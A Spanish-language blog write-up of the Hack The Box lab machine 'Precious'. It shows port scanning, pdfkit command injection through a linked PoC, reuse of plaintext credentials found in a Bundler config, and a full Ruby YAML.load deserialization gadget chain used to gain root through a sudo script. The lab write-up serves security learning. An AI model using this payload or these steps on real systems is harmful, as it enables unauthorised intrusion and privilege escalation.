<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-precious-writeup">Hack The Box: Precious Writeup</h1>
<p>Welcome to my detailed writeup of the easy difficulty machine <strong>&ldquo;Precious&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.228.98 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.228.98 -&gt; <span style="color:#f92672">[</span>22,80<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80 -sCV 10.129.228.98 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 16:48 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.98
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://precious.htb/
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.02 seconds
</span></span></code></pre></div><p>Encontramos el dominio <code>precious.htb</code>, así que lo añadimos al <code>/etc/hosts</code></p>
<h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.228.98 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 16:49 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.98
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1494</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>21898/udp closed unknown
</span></span><span style="display:flex;"><span>23256/udp closed unknown
</span></span><span style="display:flex;"><span>25249/udp closed unknown
</span></span><span style="display:flex;"><span>28692/udp closed unknown
</span></span><span style="display:flex;"><span>31743/udp closed unknown
</span></span><span style="display:flex;"><span>61142/udp closed unknown
</span></span></code></pre></div><p>El punto de entrada a esta máquina debe de ser el puerto 80/TCP</p>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<p><img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Vemos que efectivamente, el servidor nos hace una solicitud.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>10.129.228.98 - - <span style="color:#f92672">[</span>05/Aug/2024 16:53:09<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span></code></pre></div><p>Me interesa saber el <code>User-Agent</code> ya que quizás pueda revelar información relevante, así que me voy a poner en escucha con <code>netcat</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nc -lvnp <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8081</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.18<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.228.98<span style="color:#f92672">]</span> <span style="color:#ae81ff">39566</span>
</span></span><span style="display:flex;"><span>GET / HTTP/1.1
</span></span><span style="display:flex;"><span>Host: 10.10.14.18:8081
</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Unknown; Linux x86_64<span style="color:#f92672">)</span> AppleWebKit/602.1 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> wkhtmltopdf Version/10.0 Safari/602.1
</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,*/*;q<span style="color:#f92672">=</span>0.8
</span></span><span style="display:flex;"><span>Connection: Keep-Alive
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
</span></span><span style="display:flex;"><span>Accept-Language: en-US,*
</span></span></code></pre></div><p>Detectamos que se está usando <code>wkhtmltopdf</code> el cual tiene una vulnerabilidad SSRF que ya he explotado en otras ocasiones, pero esta vez por ahí no van los tiros.</p>
<h1 id="command-injection---foothold">Command Injection -&gt; Foothold</h1>
<p>Si nos descargamos un PDF generado por esta aplicación y miramos los metadatos, podemos ver lo siguiente</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool owh68flhpo0qrmf14hqn7slwa51tkwks.pdf 
</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.57
</span></span><span style="display:flex;"><span>File Name                       : owh68flhpo0qrmf14hqn7slwa51tkwks.pdf
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">11</span> kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:08:05 16:53:10+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:08:05 16:53:10+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:08:05 16:57:24+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : PDF
</span></span><span style="display:flex;"><span>File Type Extension             : pdf
</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
</span></span><span style="display:flex;"><span>Linearized                      : No
</span></span><span style="display:flex;"><span>Page Count                      : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Creator                         : Generated by pdfkit v0.8.6
</span></span></code></pre></div><p><code>pdfkit v0.8.6</code>
Una simple búsqueda en Google..</p>
<p><img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Utilizando este <a href="https://github.com/shamo0/PDFkit-CMD-Injection">PoC</a>
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p><img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<h1 id="user-pivoting">User Pivoting</h1>
<p>En busca de la flag me dí cuenta de un directorio  un tanto inusual, <code>.bundle</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> ruby ruby <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">5</span> 06:39 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ruby ruby  <span style="color:#ae81ff">220</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .bash_logout
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ruby ruby <span style="color:#ae81ff">3526</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .bashrc
</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#ae81ff">2</span> root ruby <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> .bundle
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> ruby ruby <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">5</span> 06:39 .cache
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ruby ruby  <span style="color:#ae81ff">807</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .profile
</span></span></code></pre></div><p>¡Unas credenciales!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#ae81ff">2</span> root ruby <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> ruby ruby <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">5</span> 06:39 ..
</span></span><span style="display:flex;"><span>-r-xr-xr-x <span style="color:#ae81ff">1</span> root ruby   <span style="color:#ae81ff">62</span> Sep <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> config
</span></span><span style="display:flex;"><span>cat config
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>BUNDLE_HTTPS://RUBYGEMS__ORG/: <span style="color:#e6db74">&#34;henry:Q3c1AqGHtoI0aXAYFH&#34;</span>
</span></span></code></pre></div><p>Investigando sobre este archivo, es una herramienta para gestionar las dependencias de los proyectos en Ruby.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> ssh henry@10.129.228.98
</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.129.228.98 (10.129.228.98)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.129.228.98<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">henry@10.129.228.98&#39;</span>s password: 
</span></span><span style="display:flex;"><span>Linux precious 5.10.0-19-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.149-2 (2022-10-21) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>henry@precious:~$
</span></span></code></pre></div><p>Y podríamos leer la flag de usuario.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>henry@precious:~$ cat /home/henry/user.txt 
</span></span><span style="display:flex;"><span>0801b15e447149...
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Podemos ejecutar el script <code>/opt/update_dependencies.rb</code> como el usuario <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>henry@precious:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> henry on precious:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User henry may run the following commands on precious:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
</span></span></code></pre></div><p>Este es el script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Compare installed dependencies with those specified in &#34;dependencies.yml&#34;</span>
</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;yaml&#34;</span>
</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;rubygems&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># TODO: update versions automatically</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_gems</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_from_file</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">YAML</span><span style="color:#f92672">.</span>load(<span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#34;dependencies.yml&#34;</span>))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_local_gems</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Specification</span><span style="color:#f92672">.</span>sort_by{ <span style="color:#f92672">|</span>g<span style="color:#f92672">|</span> <span style="color:#f92672">[</span>g<span style="color:#f92672">.</span>name<span style="color:#f92672">.</span>downcase, g<span style="color:#f92672">.</span>version<span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>map{<span style="color:#f92672">|</span>g<span style="color:#f92672">|</span> <span style="color:#f92672">[</span>g<span style="color:#f92672">.</span>name, g<span style="color:#f92672">.</span>version<span style="color:#f92672">.</span>to_s<span style="color:#f92672">]</span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gems_file <span style="color:#f92672">=</span> list_from_file
</span></span><span style="display:flex;"><span>gems_local <span style="color:#f92672">=</span> list_local_gems
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gems_file<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>file_name, file_version<span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>    gems_local<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>local_name, local_version<span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(file_name <span style="color:#f92672">==</span> local_name)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(file_version <span style="color:#f92672">!=</span> local_version)
</span></span><span style="display:flex;"><span>                puts <span style="color:#e6db74">&#34;Installed version differs from the one specified in file: &#34;</span> <span style="color:#f92672">+</span> local_name
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>                puts <span style="color:#e6db74">&#34;Installed version is equals to the one specified in file: &#34;</span> <span style="color:#f92672">+</span> local_name
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>Al buscar en Google el método <code>YAML.load</code> el cual me llamó la atención&hellip;
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Me llamó la atención ya que este archivo se carga de forma relativa, por lo cual podríamos secuestrar el archivo <code>dependencies.yml</code> y conseguir la deserialización.</p>
<p>Vamos a usar <a href="https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/">este</a> PoC.</p>
<p>Nos creamos un archivo <code>dependencies.yml</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#ae81ff">henry@precious:/tmp$ cat dependencies.yml </span>
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::Installer</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">i</span>: <span style="color:#ae81ff">x</span>
</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::SpecFetcher</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">i</span>: <span style="color:#66d9ef">y</span>
</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::Requirement</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">requirements</span>:
</span></span><span style="display:flex;"><span>    !<span style="color:#ae81ff">ruby/object:Gem::Package::TarReader</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">io</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Net::BufferedIO</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">io</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Gem::Package::TarReader::Entry</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">read</span>: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">header</span>: <span style="color:#e6db74">&#34;abc&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">debug_output</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Net::WriteAdapter</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">socket</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Gem::RequestSet</span>
</span></span><span style="display:flex;"><span>             <span style="color:#f92672">sets</span>: !<span style="color:#ae81ff">ruby/object:Net::WriteAdapter</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#f92672">socket</span>: !<span style="color:#ae81ff">ruby/module &#39;Kernel&#39;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#f92672">method_id</span>: :<span style="color:#ae81ff">system</span>
</span></span><span style="display:flex;"><span>             <span style="color:#f92672">git_set</span>: <span style="color:#ae81ff">id</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">method_id</span>: :<span style="color:#ae81ff">resolve</span>
</span></span></code></pre></div><p>Ahora si todo sale bien, se debería de ejecutar el comando <code>id</code> que es el que está en el campo <code>git_set</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb
</span></span><span style="display:flex;"><span>sh: 1: reading: not found
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>	33: from /opt/update_dependencies.rb:17:in <span style="color:#e6db74">`</span>&lt;main&gt;<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;</span>
</span></span><span style="display:flex;"><span>	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in <span style="color:#e6db74">`</span>load<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39;</span>
</span></span><span style="display:flex;"><span>....
</span></span></code></pre></div><p>Y podemos ver que se ejecuta.</p>
<p>Ahora solo falta cambiar el comando que queremos ejecutar en el archivo <code>dependencies.yml</code>
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>henry@precious:/tmp$ ls -la /bin/bash
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234376</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> /bin/bash
</span></span></code></pre></div><p>Ahora ejecutamos el script&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>henry@precious:/tmp$ ls -la /bin/bash
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234376</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> /bin/bash
</span></span><span style="display:flex;"><span>henry@precious:/tmp$ bash -p
</span></span><span style="display:flex;"><span>bash-5.1# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry
</span></span></code></pre></div><p>Y ya nos hemos convertido en <code>root</code>.</p>
<p>Y podríamos leer la flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.1# cat /root/root.txt
</span></span><span style="display:flex;"><span>57c37a02615a95fcde....
</span></span></code></pre></div><p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
